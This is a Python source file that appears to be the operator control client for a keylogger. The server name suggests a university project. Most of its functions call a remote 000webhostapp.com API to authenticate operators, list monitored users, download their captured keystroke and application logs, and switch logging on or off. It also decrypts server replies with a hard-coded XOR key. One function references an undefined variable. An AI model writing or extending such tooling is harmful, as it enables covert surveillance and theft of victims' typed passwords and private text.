import requests
import json
from tkinter.messagebox import showerror
import re

servername = "projectuniveristykeylogger.000webhostapp.com" 

class c_server:
    def auth(username, password):
        url = f"http://{servername}/panel/api/api.php"
        data = {
            "method": "auth",
            "username": username,
            "password": password
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
            result = ""
            try:
                result = json.loads(c_server.decryptResponse(response.text))
            except json.JSONDecodeError as e:
                showerror(title="Ошибка", message=f"JSON invalid result: {result}, Error: {e}")
                print(f"Ignoring invalid log: {result}, Error: {e}")

            
            if result["Status"] == "Successful standart user":
                return "Successful standart user"
            elif result["Status"] == "Successful admin user":
                return "Successful admin user"
            else:
                error_message = result["msg"]
                showerror(title="Ошибка", message=f"{error_message}")
                print(f"Error: {error_message}") # Incorrect user or password / Enter the username and password
            return False
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return False
    
    def getAllUsers():
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'allusers'
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
            
            # Парсим JSON-строку, полученную от сервера
            users_data = (response.text)

            if "000webhost.com" in users_data: # fix for free shit hosting
                return False
            
            # Убираем кавычки и разбиваем строку на отдельные имена
            usernames = [name.strip('"') for name in users_data.split('"') if name.strip()]
            
            # Формируем строку с разделителем "\n" для удобного вывода
            formatted_user_list = "\n".join(usernames)
            
            return usernames
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return False


    def getLogs(item):
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'logs',
            'username': item 
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
            decrypted_response = (response.text)  # Расшифровываем полученные данные
            #print("getLogs ", decrypted_response)
        
            logs = decrypted_response.split('\n')  # Разделить логи по символу новой строки
            decrypted_logs = []
            for log in logs:
                log = log.strip()
                if log:  # Проверяем, что строка не пустая
                    try:
                        decrypted_logs.append(json.loads(log)) # TODO #TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO#TODO
                    except json.JSONDecodeError as e:#TODO
                        pass#TODO
                        #showerror(title="Ошибка", message=f"Ignoring invalid log: {log}, Error: {e}") #TODO
                        #print(f"Ignoring invalid log: {log}, Error: {e}")
        
            return decrypted_logs
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return False    

    def getApplicationLogs(item):
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'applicationlogs',
            'username': item 
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
            decrypted_text_json_data = ""
            #print("getApplicationLogs -", response.text)

            if response.text != "" and not "000webhost.com" in response.text: # fix for free shit hosting
                try:
                    decrypted_text_json_data = json.loads(response.text)
                    print("Decoded JSON:", decrypted_text_json_data)
                    return decrypted_text_json_data
                except json.JSONDecodeError as e:
                    showerror(title="Ошибка", message=f"Ignoring invalid log: {decrypted_text_json_data}, Error: {e}")
                    print(f"Ignoring invalid log: {decrypted_text_json_data}, Error: {e}")
            
            return False
        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return False    

    def getCurrentActive(item):
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'getactive',
            'username': item 
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes

            # Парсим JSON-строку, полученную от сервера
            active_status = response.text
            

            if "000webhost.com" in active_status: # fix for free shit hosting
                return False

            return active_status

        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return False

    def setCurrentActive(item, var):
        url = f'http://{servername}/panel/api/api.php'
        # Данные для отправки в POST запросе
        data = {
            'method': 'setactive',
            'username': item,
            'active': var
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            response = requests.post(url, data=data, headers=headers)
            #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes

            if "000webhost.com" in active_status: # fix for free shit hosting
                return False

            return True

        except requests.exceptions.RequestException as e:
            showerror(title="Ошибка", message=f"{e}")
            print(f"Error sending message to server: {e}")
            return False

    def decryptResponse(response):
        key = [ord(c) for c in "ztWuu0JVnaFm0rtDi1qd6Fwlus61MOkv"]  # Convert key characters to ASCII values

        output = ""
        for i in range(len(response)):
            output += chr(ord(response[i]) ^ key[i % len(key)])  # Perform XOR operation with key

        return output
